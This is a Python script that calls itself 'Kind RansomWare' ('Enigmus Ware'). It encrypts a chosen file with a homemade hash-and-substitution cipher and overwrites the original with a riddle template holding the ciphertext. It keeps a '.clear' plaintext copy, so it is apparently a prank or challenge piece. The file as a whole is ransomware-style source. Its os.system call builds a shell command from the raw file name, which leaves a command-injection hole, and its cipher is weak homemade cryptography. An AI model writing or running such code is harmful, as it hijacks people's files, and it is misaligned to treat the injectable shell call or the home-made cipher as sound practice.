import tomllib
import argparse
import os
import base64
import python_obfuscator
import shutil
obfuscator = python_obfuscator.obfuscator()

nbrs = ["ڐ","ڿ","؄","؁","﷽","ﰱ","ﳑ","ﷲ","؀","ۼ"]
#Mapping [0,1,2,3,4,5,6,7,8,9]
file_template = """




"""


parser = argparse.ArgumentParser(
                    prog = 'Enigmus Ware',
                    description = 'Kind RansomWare - Mission 7 bis (with more fun lmao)',
                    epilog = 'Do not use on sensitive files lol.')

parser.add_argument('filename')           # positional argument
parser.add_argument('-c', '--config', required=False, default="./config.toml")      # option that takes a value
args = parser.parse_args()

def myHash(text:str):
  hash=0
  for ch in text:
    hash = ( hash*281  ^ ord(ch)*997) & 0xFFFFFFFF
  return hex(hash)[2:].upper().zfill(8)


def encrypt(text, key):
    text = f"{nbrs[0]}{text}{nbrs[-1]}" #Char to verify decoded text is good
    key = str(myHash(key.lower()))
    long_key = ""
    while len(long_key) < len(text):
        long_key += key
    result = []
    for text_char, key_char in zip(text, long_key):
        text_nbr = ord(text_char) #Return char number
        key_nbr = ord(key_char) #Return the key number
        num = str(text_nbr + key_nbr)
        weird = ""
        for x in num:
            weird += nbrs[int(x)]
        result.append(weird)
    result_text = ""
    for u in result:
        sep = "⁣"
        result_text += f"{u}{sep}"
    result_text = result_text[:-1]
    return base64.b64encode(result_text.encode()).decode()

with open(args.config, "rb") as f:
    config = tomllib.load(f)
    if not "key" in config.keys() or not "enigm" in config.keys():
        print("Config should contain a key and an enigm !")
    file = open(args.filename, "r", errors="ignore")
    content = file.read()
    file.close()
    encrypted_content = encrypt(content,config["key"])
    with open("template.py", "r", encoding="utf-8") as u:
        template = u.read()
        template = template.replace("$ENIGM$", config["enigm"])
        template = template.replace("$CONTENT$", encrypted_content)
        fileName = args.filename
        shutil.copyfile(fileName, fileName+".clear")
        file = open(fileName, "w", encoding="utf-8")
        file.write(template)
        import os
        os.system("python -OO -m py_compile "+fileName)
        file.close()
    print("File successfuly encrypted.")
    